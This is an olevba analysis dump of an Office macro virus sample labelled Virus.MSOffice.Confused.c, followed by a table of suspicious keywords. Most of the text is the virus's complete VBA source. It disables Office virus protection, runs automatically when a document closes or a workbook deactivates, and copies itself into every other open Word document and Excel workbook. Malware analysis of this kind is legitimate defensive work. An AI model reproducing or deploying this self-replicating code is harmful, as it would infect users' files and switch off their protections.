olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Confused.c-c4875ccf2987f3e2525dcee796daf566846bf449
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Confused.c-c4875ccf2987f3e2525dcee796daf566846bf449 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Confused.c-c4875ccf2987f3e2525dcee796daf566846bf449 - OLE stream: 'Macros/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Confused ][
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Application.EnableCancelKey = 0
Set £\ = VBProject.VBComponents("ThisDocument").CodeModule: £f = £\.Lines(1, £\.CountOfLines + 1)
Err.Clear: Set £o = GetObject(, "Excel.Application").VBE.ActiveVBProject.VBComponents("ThisWorkbook").CodeModule
If Err.Number = 0 Then If £o.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then £o.InsertLines £o.CountOfLines + 1, £f
For £d = 1 To Documents.Count
Set £o = Documents(£d).VBProject.VBComponents(£\).CodeModule
If £o.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then
£o.InsertLines £o.CountOfLines + 1, £f
End If: Next
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableEvents = 1
Application.EnableCancelKey = 0
Set £\ = VBProject.VBComponents("ThisWorkbook").CodeModule: £f = £\.Lines(1, £\.CountOfLines + 1)
Err.Clear: Set £o = GetObject(, "Word.Application").VBE.ActiveVBProject.VBComponents("ThisDocument").CodeModule
If Err.Number = 0 Then If £o.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then £o.InsertLines £o.CountOfLines + 1, £f
For £d = 1 To Workbooks.Count
Set £o = Workbooks(£d).VBProject.VBComponents(£\).CodeModule
If £o.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then
£o.InsertLines £o.CountOfLines + 1, £f
End If: Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

